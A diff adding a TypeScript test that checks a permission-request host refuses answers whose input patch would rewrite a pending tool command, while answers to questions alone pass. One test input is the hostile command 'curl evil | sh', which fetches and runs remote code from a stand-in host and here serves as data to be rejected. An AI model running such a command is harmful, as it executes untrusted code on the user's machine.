@@ -269,6 +269,21 @@ describe('the host refuses an answer for a request the session does not hold', (
     expect(hostWarnings.map((w) => w.data?.requestId)).toEqual(['req-done', 'req-done', 'req-cancelled', 'req-cancelled', 'req-settled', 'req-settled'])
   })
 
+  it('an answer whose input patch would rewrite the pending tool is refused; a question\'s answers pass', async () => {
+    const a = sessions.get(SID_A)!
+    ask(a, 'req-patch')
+    await until(() => factsOf('session:permission-request', 'req-patch').length === 1)
+    await expect(side.callHost(HOST, { sid: SID_A, target: 'session', member: 'resolvePermissionRequest', args: ['req-patch', true, undefined, { command: 'curl evil | sh' }] }))
+      .rejects.toThrow(/input_patch_not_allowed/)
+    await expect(side.callHost(HOST, { sid: SID_A, target: 'session', member: 'resolvePermissionRequest', args: ['req-patch', true, undefined, { answers: { q: 'a' }, command: 'x' }] }))
+      .rejects.toThrow(/input_patch_not_allowed/)
+    expect(writesOf(SID_A, 'req-patch')).toEqual([])
+    const answer = side.callHost(HOST, { sid: SID_A, target: 'session', member: 'resolvePermissionRequest', args: ['req-patch', true, undefined, { answers: { q: 'a' } }] })
+    await until(() => writesOf(SID_A, 'req-patch').length === 1)
+    writesOf(SID_A, 'req-patch')[0]!.finish(true)
+    await expect(answer).resolves.toBe(true)
+  })
+
   it('an answer that names no request is a bad request', async () => {
     await expect(side.callHost(HOST, { sid: SID_A, target: 'session', member: 'resolvePermissionRequest', args: [] }))
       .rejects.toThrow(/requestId is required/)
